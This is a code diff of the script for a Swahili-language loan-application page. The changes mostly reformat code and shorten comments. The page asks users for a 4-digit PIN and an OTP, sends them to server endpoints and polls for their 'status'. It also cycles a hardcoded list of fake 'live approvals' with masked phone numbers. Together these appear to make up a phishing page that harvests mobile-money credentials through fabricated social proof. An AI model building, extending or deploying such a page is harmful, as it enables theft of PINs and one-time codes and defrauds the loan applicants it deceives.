     if (!phone || phone.length < 9) {
-        showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakimu 9.');
-        shakeField('s2ph');
-        return;
+      showErr('s2Err', 'Tafadhali weka nambari sahihi ya simu ya tarakimu 9.');
+      shakeField('s2ph');
+      return;
     }
 
     clearErr('s2Err');
@@ -996,7 +866,8 @@ body {
     document.getElementById('sN').textContent = [S.first, S.last].filter(Boolean).join(' ') || '—';
 
     goTo('page-step3');
-}
+  }
+
   function submitApp() {
     const income = document.getElementById('s3in').value;
     if (!income || Number(income) <= 0) {
@@ -1022,9 +893,7 @@ body {
     }, 1500);
   }
 
-  // ══════════════════════════════════════════════════════
-  // INLINE MESSAGE HELPERS
-  // ══════════════════════════════════════════════════════
+  // INLINE MESSAGES
   function showLoginMsg(text) {
     document.getElementById('lgMsgTxt').textContent = text;
     document.getElementById('lgMsg').classList.add('show');
@@ -1047,9 +916,7 @@ body {
     });
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOGIN PAGE — PIN INPUT HELPERS (4 digits)
-  // ══════════════════════════════════════════════════════
+  // LOGIN PIN HANDLERS
   function pinMv(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 3) document.getElementById('p' + (i+1)).focus();
@@ -1068,9 +935,6 @@ body {
     });
   }
 
-  // ══════════════════════════════════════════════════════
-  // LOGIN — CALLS /api/verify-pin
-  // ══════════════════════════════════════════════════════
   let _loginInFlight = false;
 
   async function doLogin() {
@@ -1134,9 +998,7 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-pin-status
-  // ══════════════════════════════════════════════════════
+  // PIN STATUS POLLING
   let pinPollInterval = null;
 
   function pollPinStatus() {
@@ -1197,9 +1059,7 @@ body {
     }, 300000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // OTP INPUT HELPERS (4 digits)
-  // ══════════════════════════════════════════════════════
+  // OTP HELPERS
   function otpMv(el, i) {
     el.value = el.value.replace(/\D/, '');
     if (el.value && i < 3) document.getElementById('o' + (i+1)).focus();
@@ -1230,9 +1090,6 @@ body {
     }, 1000);
   }
 
-  // ══════════════════════════════════════════════════════
-  // RESEND OTP
-  // ══════════════════════════════════════════════════════
   async function resendOtp() {
     if (!S.applicationId) return;
     try {
@@ -1256,9 +1113,6 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // OTP SUBMIT (4 digits)
-  // ══════════════════════════════════════════════════════
   async function doOtp() {
     const otp = [0,1,2,3].map(j => document.getElementById('o'+j).value).join('');
 
@@ -1307,9 +1161,7 @@ body {
     }
   }
 
-  // ══════════════════════════════════════════════════════
-  // POLL /api/check-otp-status
-  // ══════════════════════════════════════════════════════
+  // OTP STATUS POLLING
   let otpPollInterval = null;
 
   function pollOtpStatus() {
@@ -1386,11 +1238,8 @@ body {
     }, 300000);
   }
 
-// ══════════════════════════════════════════════════════
-// LIVE APPROVAL POPUP LOGIC (Landing Page Only)
-// ══════════════════════════════════════════════════════
-document.addEventListener("DOMContentLoaded", () => {
-
+  // LIVE APPROVAL POPUP LOGIC
+  document.addEventListener("DOMContentLoaded", () => {
     const liveApprovals = [
         { number: "062*****841", location: "Dar es Salaam", amount: "TSh 10,000" },
         { number: "062*****375", location: "Arusha", amount: "TSh 25,000" },
@@ -1436,12 +1285,8 @@ document.addEventListener("DOMContentLoaded", () => {
         lastIndex = index;
 
         const user = liveApprovals[index];
-
         popupAvatar.textContent = user.number.substring(0, 2);
-
-        popupText.innerHTML = `
-            <strong>${user.number}</strong> (${user.location}) ameidhinishiwa <strong>${user.amount}</strong>
-        `;
+        popupText.innerHTML = `<strong>${user.number}</strong> (${user.location}) ameidhinishiwa <strong>${user.amount}</strong>`;
 
         popup.classList.add("show");
 
@@ -1452,13 +1297,10 @@ document.addEventListener("DOMContentLoaded", () => {
 
     setTimeout(displayPopup, 2000);
     setInterval(displayPopup, 3500);
+  });
 
-});
-
-// ══════════════════════════════════════════════════════
-// INIT
-// ══════════════════════════════════════════════════════
-calcUp();  calcUp();
+  // INIT CALCULATOR
+  calcUp();
 </script>
 </body>
 </html>
